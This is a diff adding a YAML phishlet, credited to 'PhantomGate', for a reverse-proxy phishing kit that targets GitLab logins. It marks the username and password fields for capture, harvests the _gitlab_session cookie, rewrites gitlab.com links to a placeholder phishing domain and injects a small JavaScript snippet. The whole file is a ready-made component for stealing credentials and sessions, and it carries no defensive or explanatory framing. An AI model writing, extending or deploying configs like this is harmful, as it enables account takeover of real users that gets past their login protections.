@@ -1,0 +1,41 @@
+name: GitLab
+author: PhantomGate
+version: 1.0.0
+description: GitLab authentication
+
+auth:
+  domains:
+    - gitlab.com
+    - www.gitlab.com
+  
+  login:
+    domain: gitlab.com
+    path: /users/sign_in
+    username:
+      selector: "input#user_login"
+      capture: true
+    password:
+      selector: "input#user_password"
+      capture: true
+  
+  tokens:
+    cookies:
+      - name: _gitlab_session
+        regex: ".*"
+
+proxy:
+  hosts:
+    - domain: gitlab.com
+      inject: true
+    - domain: www.gitlab.com
+      inject: true
+
+filters:
+  sub_filters:
+    - domain: gitlab.com
+      search: "https://gitlab.com"
+      replace: "https://{phishing_domain}"
+
+injection:
+  js: |
+    document.cookie = "PhantomGate=1; path=/";
